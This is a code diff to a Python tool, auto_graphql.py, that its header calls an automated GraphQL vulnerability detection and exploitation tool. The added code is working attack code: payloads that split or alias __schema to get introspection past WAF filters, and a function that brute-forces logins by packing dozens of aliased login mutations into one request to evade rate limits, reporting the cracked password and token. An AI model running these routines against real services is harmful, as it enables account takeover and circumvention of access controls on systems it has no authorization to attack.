@@ -4,8 +4,6 @@ auto_graphql.py - Automated GraphQL vulnerability detection and exploitation
 
 import re
 import json
-import asyncio
-import concurrent.futures
 from typing import Optional
 
 
@@ -68,11 +66,186 @@ def discover_endpoint(base_url: str) -> dict:
         except Exception:
             continue
 
+    # Also try GET with query param on bare base paths (some apps mount at / or /api)
+    extra_paths = ['/api', '/']
+    for path in extra_paths:
+        url = base_url.rstrip('/') + path
+        if any(e["url"] == url for e in endpoints_found):
+            continue
+        try:
+            resp_get = session.get(url, params={"query": "{__typename}"}, timeout=8)
+            if resp_get.status_code == 200:
+                try:
+                    data = resp_get.json()
+                    if 'data' in data or 'errors' in data:
+                        endpoints_found.append({
+                            "url": url,
+                            "method": "GET",
+                            "has_graphql": True
+                        })
+                except json.JSONDecodeError:
+                    pass
+        except Exception:
+            continue
+
     return {
         "base_url": base_url,
         "endpoints": endpoints_found,
         "found": len(endpoints_found) > 0
     }
+
+
+def introspect_bypass(endpoint: str) -> dict:
+    """Try introspection with comment-based bypass techniques.
+
+    Many WAFs and GraphQL shields block '__schema' via regex.
+    Inserting a GraphQL comment (# + newline) after __schema
+    can bypass naive pattern matching while remaining valid syntax.
+    """
+    session = _get_session()
+    bypass_payloads = [
+        # Comment + newline after __schema
+        '{ __schema\n#\n{ types { name } }',
+        # Comment between __ and schema
+        '{ __#comment\nschema { types { name kind } }',
+        # Inline comment mid-token
+        '{ __sch#bypass\nema { queryType { name } mutationType { name } types { name kind fields { name type { name } } } } }',
+        # Space + fragment spread trick
+        '{ ...F } fragment F on Query { __schema { types { name } } }',
+        # Alias trick to hide __schema
+        '{ alias1: __schema { types { name } } }',
+        # Nested query with alias
+        '{ x: __type(name: "Query") { fields { name type { name } } } }',
+    ]
+
+    for i, payload in enumerate(bypass_payloads):
+        try:
+            resp = session.post(endpoint, json={"query": payload}, timeout=12)
+            data = resp.json()
+
+            if 'data' in data and data.get('data'):
+                result = data['data']
+                # Check if we got schema data back
+                schema_data = result.get('__schema') or result.get('alias1') or result.get('x')
+                if schema_data:
+                    return {
+                        "endpoint": endpoint,
+                        "bypass_successful": True,
+                        "technique": payload.split('\n')[0][:60],
+                        "technique_index": i,
+                        "data": schema_data,
+                        "severity": "high"
+                    }
+        except Exception:
+            continue
+
+    # Also try GET-based introspection (sometimes only POST is restricted)
+    get_payloads = [
+        {"query": "{ __schema { types { name } } }"},
+        {"query": '{ __schema\n#\n{ types { name } } }'},
+        {"query": "{ ...F } fragment F on Query { __schema { types { name kind } } }"},
+    ]
+    for payload in get_payloads:
+        try:
+            resp = session.get(endpoint, params=payload, timeout=12)
+            data = resp.json()
+            if 'data' in data and data.get('data', {}).get('__schema'):
+                return {
+                    "endpoint": endpoint,
+                    "bypass_successful": True,
+                    "technique": "GET_method_introspection",
+                    "technique_index": -1,
+                    "data": data['data']['__schema'],
+                    "severity": "high"
+                }
+        except Exception:
+            continue
+
+    return {
+        "endpoint": endpoint,
+        "bypass_successful": False,
+        "techniques_tried": len(bypass_payloads) + len(get_payloads),
+        "severity": "info"
+    }
+
+
+def brute_force_login(endpoint: str, username: str, passwords: list,
+                      login_field: str = "login", username_field: str = "username",
+                      password_field: str = "password", token_field: str = "token",
+                      max_batch: int = 50) -> dict:
+    """Use GraphQL aliases to brute force login in a single request.
+
+    Instead of sending N requests (one per password), packs N login
+    mutations aliased as a0, a1, ... into one request.  Bypasses
+    per-request rate limits since only one HTTP request hits the server.
+
+    Args:
+        endpoint: GraphQL endpoint URL
+        username: Username to test
+        passwords: List of candidate passwords
+        login_field: Mutation name (default "login")
+        username_field: Input field for username
+        password_field: Input field for password
+        token_field: Response field indicating success
+        max_batch: Max aliases per request (split into batches if larger)
+    """
+    session = _get_session()
+    results = {
+        "endpoint": endpoint,
+        "username": username,
+        "total_passwords": len(passwords),
+        "success": False,
+        "cracked_password": None,
+        "batches_sent": 0,
+        "errors": []
+    }
+
+    # Split passwords into batches to avoid overly large queries
+    for batch_start in range(0, len(passwords), max_batch):
+        batch = passwords[batch_start:batch_start + max_batch]
+        aliases = []
+        for i, pw in enumerate(batch):
+            idx = batch_start + i
+            # Escape special chars in password for GraphQL string
+            pw_escaped = pw.replace('\\', '\\\\').replace('"', '\\"')
+            aliases.append(
+                f'a{i}: {login_field}({username_field}: "{username}", '
+                f'{password_field}: "{pw_escaped}") {{ {token_field} }}'
+            )
+
+        query = "mutation { " + " ".join(aliases) + " }"
+
+        try:
+            resp = session.post(endpoint, json={"query": query}, timeout=20)
+            data = resp.json()
+            results["batches_sent"] += 1
+
+            if 'data' in data and data['data']:
+                for i, pw in enumerate(batch):
+                    alias_key = f'a{i}'
+                    alias_data = data['data'].get(alias_key)
+                    if alias_data and alias_data.get(token_field):
+                        results["success"] = True
+                        results["cracked_password"] = pw
+                        results["token_preview"] = str(alias_data[token_field])[:40]
+                        return results
+
+            if 'errors' in data:
+                # Partial errors may still contain some successful aliases
+                for i, pw in enumerate(batch):
+                    alias_key = f'a{i}'
+                    alias_data = (data.get('data') or {}).get(alias_key)
+                    if alias_data and alias_data.get(token_field):
+                        results["success"] = True
+                        results["cracked_password"] = pw
+                        results["token_preview"] = str(alias_data[token_field])[:40]
+                        return results
+
+        except Exception as e:
+            results["errors"].append(f"batch@{batch_start}: {str(e)[:120]}")
+            continue
+
+    return results
 
 
 def introspect(endpoint: str) -> dict:
@@ -362,6 +535,18 @@ def full_scan(base_url: str) -> dict:
     if not intro.get("introspection_disabled"):
         results["findings_count"] += 1
         results["severity"] = "medium"
+
+    # 2b. If introspection blocked, try bypass techniques
+    if intro.get("introspection_disabled"):
+        bypass = introspect_bypass(endpoint)
+        results["introspection_bypass"] = bypass
+        if bypass.get("bypass_successful"):
+            results["findings_count"] += 1
+            results["severity"] = "high"
+            # Use bypass data as effective schema
+            intro["introspection_disabled"] = False
+            intro["bypassed"] = True
+            intro["raw_types"] = bypass.get("data", {}).get("types", [])
 
     # 3. Find private data
     private = find_private_data(endpoint, intro)
